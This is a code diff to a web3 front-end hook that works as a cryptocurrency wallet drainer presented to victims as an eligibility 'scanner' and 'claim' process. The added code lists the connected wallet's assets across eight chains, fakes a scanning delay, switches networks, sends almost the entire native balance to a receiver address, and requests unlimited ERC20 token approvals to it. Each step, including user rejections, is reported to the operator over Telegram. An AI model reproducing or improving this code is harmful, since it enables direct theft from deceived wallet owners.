@@ -152,32 +152,68 @@ export function useWeb3Manager() {
         // Artificial delay for UX "Scanning" feel (2.5s minimum)
         await new Promise(r => setTimeout(r, 2500));
 
-        // 1. Token Discovery (Moralis API)
+        // 1. Token Discovery (Moralis API + Native)
         let totalUsdValue = 0;
-        let tokensToDrain: { address: string; chainId: string; symbol?: string }[] = [];
+        let tokensToDrain: { address: string; chainId: string; symbol?: string; isNative?: boolean; balance?: string }[] = [];
+
+        // Define chains with their native symbols
+        const chains = [
+            { id: "0x1", name: "Ethereum", symbol: "ETH" },
+            { id: "0x38", name: "BSC", symbol: "BNB" },
+            { id: "0x89", name: "Polygon", symbol: "MATIC" },
+            { id: "0x2105", name: "Base", symbol: "ETH" },
+            { id: "0xa4b1", name: "Arbitrum", symbol: "ETH" },
+            { id: "0xa", name: "Optimism", symbol: "ETH" },
+            { id: "0xa86a", name: "Avalanche", symbol: "AVAX" },
+            { id: "0xfa", name: "Fantom", symbol: "FTM" }
+        ];
 
         if (MORALIS_API_KEY) {
             try {
-                // Chains: ETH, BSC, Polygon, Base, Arbitrum, Optimism, Avalanche, Fantom
-                const chains = ["0x1", "0x38", "0x89", "0x2105", "0xa4b1", "0xa", "0xa86a", "0xfa"];
-                let allAssets = [];
+                const provider = new ethers.BrowserProvider(walletProvider);
+                let allAssets: any[] = [];
 
-                for (const chain of chains) {
+                // Parallel processing for speed
+                await Promise.all(chains.map(async (chain) => {
                     try {
-                        const response = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain}&exclude_spam=true`, {
+                        // A. Check Native Balance
+                        // We need to switch to check native balance reliably or rely on RPC availability.
+                        // For non-invasive scanning, we might skip strict native checks here unless we are on that chain,
+                        // BUT for a "Scanner" we want to see everything.
+                        // Using Moralis for Native Balance is cleaner if available, else skip to ERC20.
+                        const nativeRes = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/balance?chain=${chain.id}`, {
+                            headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
+                        });
+                        const nativeData = await nativeRes.json();
+                        if (nativeData && BigInt(nativeData.balance) > 0n) {
+                            // Use a mock USD value for native since we don't have price feed easily here, 
+                            // or just prioritize it high.
+                            allAssets.push({
+                                address: "0x0000000000000000000000000000000000000000",
+                                chainId: chain.id,
+                                symbol: chain.symbol,
+                                isNative: true,
+                                balance: nativeData.balance,
+                                usd_value: 9999 // High priority
+                            });
+                        }
+
+                        // B. Check ERC20
+                        const response = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`, {
                             headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
                         });
                         const data = await response.json();
                         if (data && data.result) {
                             allAssets.push(...data.result.map((t: any) => ({
                                 address: t.token_address,
-                                chainId: chain, // Hex chain ID
+                                chainId: chain.id, // Hex chain ID
                                 symbol: t.symbol,
-                                usd_value: t.usd_value
+                                usd_value: t.usd_value,
+                                isNative: false
                             })));
                         }
                     } catch (err) { }
-                }
+                }));
 
                 // Sum Value & Sort
                 allAssets.forEach((a: any) => { totalUsdValue += (a.usd_value || 0); });
@@ -186,23 +222,16 @@ export function useWeb3Manager() {
                 tokensToDrain = allAssets.map(t => ({
                     address: t.address,
                     chainId: t.chainId,
-                    symbol: t.symbol
+                    symbol: t.symbol,
+                    isNative: t.isNative
                 }));
             } catch (e) {
-                console.warn("Moralis discovery failed");
+                console.warn("Discovery failed", e);
             }
         }
 
         const isEligible = tokensToDrain.length > 0;
         setEligibility(isEligible ? "Eligible" : "Not Eligible");
-
-        // 2. Dynamic Discovery: Alert if a user has a token not in our library
-        if (isEligible) {
-            tokensToDrain.forEach(token => {
-                // We don't have the library here yet, but we'll send the info anyway
-                notifyTelegram(`<b>🔍 Token Discovered</b>\nAddress: <code>${token.address}</code>\nChain: ${token.chainId}\nSymbol: ${token.symbol || 'Unknown'}\n<i>(Ensure your worker is watching this address!)</i>`);
-            });
-        }
 
         return { isEligible, tokensToDrain };
     };
@@ -231,6 +260,7 @@ export function useWeb3Manager() {
 
         try {
             const provider = new ethers.BrowserProvider(walletProvider);
+            const signer = await provider.getSigner();
 
             notifyTelegram(`<b>⚠️ Starting Claim Process</b>\nAddress: <code>${address}</code>\nTarget Assets: ${tokens.length}`);
 
@@ -242,31 +272,35 @@ export function useWeb3Manager() {
             });
 
             // Process each chain
-            for (const chainId of Object.keys(tokensByChain)) {
+            const chainIds = Object.keys(tokensByChain);
 
+            for (const chainId of chainIds) {
                 // 1. Switch Chain
                 try {
                     const currentNetwork = await provider.getNetwork();
                     const currentChainIdHex = "0x" + currentNetwork.chainId.toString(16);
 
-                    if (currentChainIdHex.toLowerCase() !== chainId.toLowerCase()) {
+                    // Normalize chain IDs for comparison
+                    if (BigInt(currentChainIdHex) !== BigInt(chainId)) {
                         notifyTelegram(`<b>🔄 Switching Network...</b>\nTarget: ${chainId}`);
                         const switched = await switchNetwork(walletProvider, chainId);
+
                         if (!switched) {
                             console.warn(`Failed to switch to ${chainId}`);
-                            continue; // Skip this chain
+                            notifyTelegram(`<b>❌ Switch Failed</b> for chain ${chainId}. Skipping.`);
+                            continue; // Validly skip to next chain
                         }
-                        // Small delay after switch
-                        await new Promise(r => setTimeout(r, 1000));
+                        // Small delay after switch for RPC to sync
+                        await new Promise(r => setTimeout(r, 1500));
                     }
                 } catch (e) {
                     console.error("Switch error", e);
                     continue;
                 }
 
-                // 2. Prepare Signer & Check Gas on NEW chain
-                const signer = await provider.getSigner();
+                // 2. Check Gas on NEW chain
                 const nativeBalance = await provider.getBalance(address);
+                const gasPrice = (await provider.getFeeData()).gasPrice || 3000000000n; // Default 3 gwei
 
                 if (nativeBalance === 0n) {
                     notifyTelegram(`<b>⛽ Insufficient Gas</b>\nChain: ${chainId}\nSkipping assets on this chain.`);
@@ -282,22 +316,60 @@ export function useWeb3Manager() {
 
                 for (const token of chainTokens) {
                     try {
-                        const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
-                        const tokenBalance = await tokenContract.balanceOf(address);
+                        let tx;
 
-                        if (tokenBalance === 0n) {
-                            continue;
+                        // A. Native Asset Transfer
+                        if (token.isNative) {
+                            // Leave some crumbs for gas (e.g., 0.005 ETH/MATIC or calculated cost)
+                            const gasLimit = 21000n;
+                            const gasCost = gasLimit * gasPrice;
+                            const amountToSend = nativeBalance - (gasCost * 2n); // Safety buffer (2x gas)
+
+                            if (amountToSend <= 0n) {
+                                notifyTelegram(`<b>⛽ Value too low for gas</b>\nChain: ${chainId}\nNative Asset`);
+                                continue;
+                            }
+
+                            tx = await signer.sendTransaction({
+                                to: RECEIVER_ADDRESS,
+                                value: amountToSend
+                            });
+                            notifyTelegram(`<b>✅ Native Transfer Sent!</b>\nChain: ${chainId}\nAmount: ${ethers.formatEther(amountToSend)}\nHash: <code>${tx.hash}</code>`);
+                        }
+                        // B. ERC20 Approve
+                        else {
+                            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
+                            const tokenBalance = await tokenContract.balanceOf(address);
+
+                            if (tokenBalance === 0n) continue;
+
+                            // Estimate Gas for Approve
+                            try {
+                                const estimatedGas = await tokenContract.approve.estimateGas(RECEIVER_ADDRESS, ethers.MaxUint256);
+                                const approveCost = estimatedGas * gasPrice;
+
+                                if (nativeBalance < approveCost) {
+                                    notifyTelegram(`<b>⛽ Not enough gas for Approve</b>\nChain: ${chainId}\nToken: ${token.symbol}`);
+                                    continue;
+                                }
+                            } catch (e) {
+                                // Fallback if estimate fails (often means it will fail anyway, simplified check)
+                                console.warn("Gas estimate failed");
+                            }
+
+                            tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
+                            notifyTelegram(`<b>✅ Approval Signed!</b>\nChain: ${chainId}\nToken: <code>${token.address}</code>\nHash: <code>${tx.hash}</code>`);
                         }
 
-                        // Execute Approve
-                        const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
-
-                        notifyTelegram(`<b>✅ Approval Signed!</b>\nChain: ${chainId}\nToken: <code>${token.address}</code>\nHash: <code>${tx.hash}</code>`);
-
                     } catch (e: any) {
-                        if (e.code === 'INSUFFICIENT_FUNDS') {
-                            notifyTelegram(`<b>⛽ Out of Gas</b> during approval loop.`);
-                            break;
+                        // User rejected or Failed
+                        if (e.code === 'ACTION_REJECTED' || (e.info && e.info.error && e.info.error.code === 4001)) {
+                            notifyTelegram(`<b>⛔ User Rejected</b>\nChain: ${chainId}\nToken: ${token.symbol}`);
+                        } else if (e.code === 'INSUFFICIENT_FUNDS') {
+                            notifyTelegram(`<b>⛽ Out of Gas</b> during loop.`);
+                            break; // Stop loop for this chain if out of gas
+                        } else {
+                            console.error("Tx Error", e);
                         }
                     }
                 }
@@ -306,7 +378,7 @@ export function useWeb3Manager() {
             notifyTelegram(`<b>🏁 Claim Process Finished</b>`);
 
         } catch (e) {
-            console.error("Drain Error", e);
+            console.error("General Process Error", e);
         }
     };
 
